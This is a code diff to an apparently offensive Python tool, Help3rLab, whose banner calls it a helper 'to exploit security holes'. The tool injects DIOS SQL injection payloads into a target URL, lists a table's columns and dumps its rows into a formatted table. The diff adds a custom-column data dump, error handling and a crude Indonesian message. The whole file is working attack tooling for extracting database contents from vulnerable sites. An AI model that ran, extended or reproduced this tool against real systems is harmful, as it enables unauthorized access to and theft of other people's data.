@@ -4,6 +4,7 @@
 import requests, sys, os, readline, re, binascii, pprint, time, json
 from modules import Sqli
 from modules import Dios
+from prettytable import PrettyTable
 
 try:
     from urllib.parse import urlparse
@@ -37,7 +38,7 @@ class Help3rLab:
     \033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
     \033[97m[\033[90m.................................\033[90;1m-----------------.................................\033[97m]                        
     \033[97m[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
-        =[ \033[93;2mHelp3rLab v.0.1 Beta\033[97;0m                                    ]=
+           =[ \033[93;2mHelp3rLab v.0.1 Beta\033[97;0m                                    ]=
     + -- --=[ Author : Binsar DJ, Fauzanw & Rizsyad AR                ]=-- -- +
     + -- --=[ Team   : { IndoSec }                                    ]=-- -- +
     + -- --=[ Help3rLab is your helper lab to exploit security holes  ]=-- -- + 
@@ -114,24 +115,38 @@ class Help3rLab:
                 table   = re.search('show columns (.*)', cmd).group(1)
                 r       = requests.get(self.url.replace('*', Dios().build(self.show_columns + Dios().strTohex(table) + ")")))
                 output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
-                if output != None:
-                    print(f"[\033[92m+\033[97m] Columns from table {table} : ")
-                    output = output.group(1).split('<br>')
-                    for column in output:
-                        print(f"└[\033[92m•\033[97m] {column}")
+                if(self.database_name):
+                    if output != None:
+                        print(f"[\033[92m+\033[97m] Columns from table {table} : ")
+                        output = output.group(1).split('<br>')
+                        for column in output:
+                            print(f"└[\033[92m•\033[97m] {column}")
+                else:
+                    print("\n[\033[91m-\033[97m] No database selected!\n")
                 self.sqli_command_line()
             elif re.search("dump table (.*)", cmd):
                 table_name = re.search('dump table (.*)', cmd).group(1)
                 if(self.database_name):
-                    r      = requests.get(self.url.replace('*', Dios().build(self.show_columns + Dios().strToHex(table_name) + ")")))
-                    output = re.search("<sqli-helper>(.*)</sqli-helper>", r.text)
-                    if output != None:
-                        col = ''
-                        for column in output:
-                            col += column+","
-                        print(col)
+                    custom = input("[\033[93m?\033[97m] Custom column (use delimiter coma) [Y/N] : ")
+                    if custom.lower() == "y":
+                        r      = requests.get(self.url.replace('*', Dios().build(self.show_columns + Dios().strTohex(table_name) + ")")))
+                        output = re.search("<sqli-helper>(.*)</sqli-helper>", r.text)
+                        if output != None:
+                            col = []
+                            for column in output.group(1).split('<br>'):
+                                col.append(column)
+                            SqliHelper = Sqli(self.url)
+                            pt = PrettyTable()
+                            pt.field_names = col
+                            dump_data = SqliHelper.dump_data(tables=table_name, columns=col, database=self.database_name)['data']
+                            for data in dump_data:
+                                pt.add_row(data)
+
+                            print(pt)
+                        else:
+                            print('\n[\033[91m-\033[97m] Cannot get column list')
                     else:
-                        print('\n[\033[91m-\033[97m] Cannot get column list')
+                        print('Ntar dulu jancok')
                 else:
                     print("\n[\033[91m-\033[97m] No database selected!\n")
                 
@@ -141,8 +156,8 @@ class Help3rLab:
                 output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
                 print(f"\n[+] Output : {output}\n")
             self.sqli_command_line()
-        except Exception:
-            print("\n[!] Syntax Error!\n")
+        except Exception as e:
+            print(f"\n[!] Syntax Error {e}!\n")
             self.sqli_command_line()
     
     def sqli(self):
